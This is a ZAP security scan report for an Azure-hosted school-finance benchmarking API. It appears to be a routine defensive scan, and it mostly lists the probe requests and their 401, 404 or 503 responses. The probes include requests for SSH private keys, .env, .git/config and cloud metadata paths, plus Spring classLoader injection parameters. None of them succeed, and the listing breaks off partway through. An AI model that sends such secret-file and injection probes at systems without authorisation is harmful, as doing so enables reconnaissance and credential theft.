# ZAP Scanning Report

ZAP by [Checkmarx](https://checkmarx.com/).


## Summary of Alerts

| Risk Level | Number of Alerts |
| --- | --- |
| High | 0 |
| Medium | 0 |
| Low | 2 |
| Informational | 6 |




## Alerts

| Name | Risk Level | Number of Instances |
| --- | --- | --- |
| A Server Error response code was returned by the server | Low | 1 |
| Unexpected Content-Type was returned | Low | 3 |
| A Client Error response code was returned by the server | Informational | 1710 |
| Information Disclosure - Sensitive Information in URL | Informational | 1 |
| Non-Storable Content | Informational | 11 |
| Re-examine Cache-control Directives | Informational | 2 |
| Storable and Cacheable Content | Informational | 1 |
| User Agent Fuzzer | Informational | 12 |




## Alert Detail



### [ A Server Error response code was returned by the server ](https://www.zaproxy.org/docs/alerts/100000/)



##### Low (High)

### Description

A response code of 503 was returned by the server.
This may indicate that the application is failing to handle unexpected input correctly.
Raised by the 'Alert on HTTP Response Code Error' script

* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 503`
  * Other Info: ``

Instances: 1

### Solution



### Reference



#### CWE Id: [ 388 ](https://cwe.mitre.org/data/definitions/388.html)


#### WASC Id: 20

#### Source ID: 4

### [ Unexpected Content-Type was returned ](https://www.zaproxy.org/docs/alerts/100001/)



##### Low (High)

### Description

A Content-Type of text/html was returned by the server.
This is not one of the types expected to be returned by an API.
Raised by the 'Alert on Unexpected Content Types' script

* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/latest/meta-data/
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/actuator/health
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022
  * Method: `PUT`
  * Parameter: ``
  * Attack: ``
  * Evidence: `text/html`
  * Other Info: ``

Instances: 3

### Solution



### Reference




#### Source ID: 4

### [ A Client Error response code was returned by the server ](https://www.zaproxy.org/docs/alerts/100000/)



##### Informational (High)

### Description

A response code of 401 was returned by the server.
This may indicate that the application is failing to handle unexpected input correctly.
Raised by the 'Alert on HTTP Response Code Error' script

* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/identifier
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/identifier/
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/identifier
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/identifier/
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/custom-data/school/urn/identifier/
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/financial-plan/urn/2022/
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/latest/meta-data/
  * Method: `DELETE`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/._darcs
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/.bzr
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/.DS_Store
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/.git/config
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/.hg
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/.idea/WebServers.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/.php_cs.cache
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/.ssh/id_dsa
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/.ssh/id_rsa
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/.svn/entries
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/.svn/wc.db
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/1260925372524979633
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/_framework/blazor.boot.json
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/_wpeprivate/config.json
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/adminer.php
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/7137688379018039040
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/5308307285349973499
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/1384631998790168858
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/8917300206979918986
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom/1003075349066468656
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom/identifier
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom/identifier/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom/identifier%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom/identifier%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/custom%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/default
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/default/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/default%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/default%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/8184705223363321852
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/actuator/health
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 400`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/actuator/health
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/identifier
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/identifier/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/identifier%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/identifier%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn/user-defined%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school/urn%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/school%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/4261333535336520858
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/1998874197860606980
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/3364003827517692088
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/identifier
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/identifier/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/identifier%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/identifier%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber/user-defined%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/companyNumber%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set/trust%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparator-set%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/.env
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/.htaccess
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/7174518000415847286
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/schools
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/schools%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/schools%3Fname=abc
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/trace.axd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/trusts
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/comparators/trusts%3Fclass.module.classLoader.DefaultAssertionStatus=nonsense
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 404`
  * Other Info: ``
